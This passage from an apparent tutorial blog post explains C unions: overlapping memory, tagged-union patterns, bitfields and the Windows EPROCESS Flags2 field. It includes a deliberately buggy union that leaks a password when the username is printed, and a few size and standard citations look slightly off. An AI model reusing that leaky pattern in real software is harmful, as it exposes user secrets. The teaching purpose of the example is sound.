&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At offset 0x1141, the memory that holds the union &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x4&lt;/code&gt; is still set to 0x15 (21) just as before. So, the first part of the code has not changed.&lt;/p&gt;

&lt;p&gt;However, that &lt;em&gt;same exact memory location&lt;/em&gt; is also used to hold 0x41 (‘A’). We can modify the each print statement to get a better idea of what’s happening in memory:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo_u&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;foo.i: %016x, foo.c: %016x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;foo.i: %016x, foo.c: %016x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will print the 8-byte (64-bit) hex representation of each property:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;foo.i: 0000000000000015, foo.c: 0000000000000015
foo.i: 0000000000000041, foo.c: 0000000000000041
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The same memory location is used for both fields. When you set one field to a value, all other fields will use that same value. What’s the point?&lt;/p&gt;

&lt;p&gt;You can think of union fields as ways to cast data at some location. When you set any field in a union, it will update some location in memory. In this case, if you access the &lt;em&gt;i&lt;/em&gt; field, it will cast that data as an integer. If you access the &lt;em&gt;c&lt;/em&gt; field, it will cast that data as a character. Unlike structures, when you set the value of a union’s field, you will overwrite the entire space allocated for that union (minus padding for alignment).&lt;/p&gt;

&lt;p&gt;This matches the type’s definition in the ISO C 98 standard:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;A &lt;em&gt;union type&lt;/em&gt; describes an overlapping nonempty set of member of objects, each of which has anoptionally specified name and possibly distinct type.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Put another way, you can store a DWORD and a BYTE in the same four-byte region. If you had defined this as a struct, the size would be five bytes and would occupy eight bytes total (due to alignment). Compared to structs, unions are a counterintuitive way to save memory.&lt;/p&gt;

&lt;p&gt;This is one major reason why people might use unions: to save memory. The savings can prove crucial on systems with memory restrictions, or for components, like kernels, where you want to optimize memory usage.&lt;/p&gt;

&lt;p&gt;One obvious caveat here is that you can lose track of which property is in use at a given time. If you’re not aware of that, you may try to write unions as though they were structs. Consider the following buggy code:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;My favorite number is %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;My favorite number is still %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The “bug”:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My favorite number is 21
My favorite number is still 65
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This otherwise-annoying runtime bug could lead to a potentially devastating information leaks with a union like:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserInfo_u&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;birthyear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;creditCardNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; 
&lt;span class=&quot;nf&quot;&gt;SetUsername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserInfo_u&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;SetSecurePassword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserInfo_u&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; 
&lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserInfo_u&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;SetUsername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;SetSecurePassword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Username: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// $ gcc userinfo.c -o userinfo&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// $ ./userinfo&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Username: S3cure_Pa$$w0rd&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For this reason, it’s common to see different patterns that indicate which “property” is currently in use.&lt;/p&gt;

&lt;p&gt;An obvious solution is to use a module-level or global variable. An obvious caveat is that you’re now tracking different variables that refer to the same data.&lt;/p&gt;

&lt;p&gt;Another solution is to encapsulate the union in a structure which tracks the current type. Consider the example:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SomeUnion_u&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;property&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo_A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo_B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo_C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo_D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo_E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;property&lt;/code&gt; field is honestly an arbitrary data type. An &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int&lt;/code&gt; would let you “select” the current field to use, similar to how an index in an array lets you select which element you want. Unlike an array, a union may have variable data types, so this might be an acceptable way to abstract data for some purpose.&lt;/p&gt;

&lt;p&gt;With 64-bit alignment, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SomeUnion_u&lt;/code&gt; union only takes up only 8 bytes. If it were a struct instead, it would be closer to 40 bytes. If you had an array of such structs, it could take over 4x the amount of space.&lt;/p&gt;

&lt;p&gt;This approach is simple but, unfortunately, also naive. You still have to allocate extra space to work with the “property” field. In addition, because there are so many different types, it should make you wonder if a struct wouldn’t be a better choice, albeit at a storage cost.&lt;/p&gt;

&lt;p&gt;Because of these reasons, you’re likely not to see unions as a way to naively replace structures. You are far more likely to see them as a creative way to manipulate data in some memory space. The Windows kernel has a few examples of ways to do this.&lt;/p&gt;

&lt;h1 id=&quot;using-data-bitfields&quot;&gt;Using data bitfields&lt;/h1&gt;

&lt;p&gt;Let’s consider a use case where you want to manipulate specific bits in a byte, word, dword, or qword. Traditionally, this is handled through bit-mask operations (AND’ing or OR’ing). They work, and they’re good to know, but the syntax is pretty ugly.&lt;/p&gt;

&lt;p&gt;Unions let you handle the bits without all the ugly bit-mask syntax.&lt;/p&gt;

&lt;p&gt;For example, consider:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataWithBitfields_u&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit2_3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nibble1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here, we have a one-byte union: an unsigned char, which can be evaluated at face value; and an eight-bit struct, which allows us to operate on bits 1, 2, 3, 4, and the last four bits, independently. This gives us two ways to handle the same data at this byte.&lt;/p&gt;

&lt;p&gt;Each bit can be manipulated as a property. However, if you want to evaluate the entire 8-bit (1 byte) space of memory, you can do it by accessing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; field directly. It works because it all refers to the same exact data.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataWithBitfields_u&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit2_3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nibble1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; 
&lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataWithBitfields_u&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit2_3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using bitfields in this way is a common development pattern in the EPROCESS structure, a data type used in the Windows kernel to store information about processes. You’ll notice this in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Flags2&lt;/code&gt; field:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_EPROCESS&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flags2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                              &lt;span class=&quot;c1&quot;&gt;//0x460&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JobNotReallyActive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;//0x460&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AccountingFolded&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;              &lt;span class=&quot;c1&quot;&gt;//0x460&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NewProcessReported&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;//0x460&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExitProcessReported&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;c1&quot;&gt;//0x460&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
